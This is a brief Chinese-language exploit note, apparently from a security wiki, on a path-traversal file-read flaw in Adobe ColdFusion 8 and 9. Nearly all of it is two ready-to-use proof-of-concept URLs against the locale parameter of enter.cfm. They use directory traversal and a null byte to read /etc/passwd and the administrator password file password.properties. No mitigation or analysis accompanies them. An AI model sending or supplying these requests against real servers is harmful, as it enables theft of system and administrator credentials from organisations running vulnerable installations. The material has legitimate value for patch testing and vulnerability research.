# Adobe ColdFusion 文件读取漏洞

最后更新于：2020-09-21 13:01:58

### 漏洞范围

Adobe ColdFusion 8、9

### 漏洞POC

读取etc/passwd

```bash
http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en
```

读取后台管理员密码

```bash
http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
```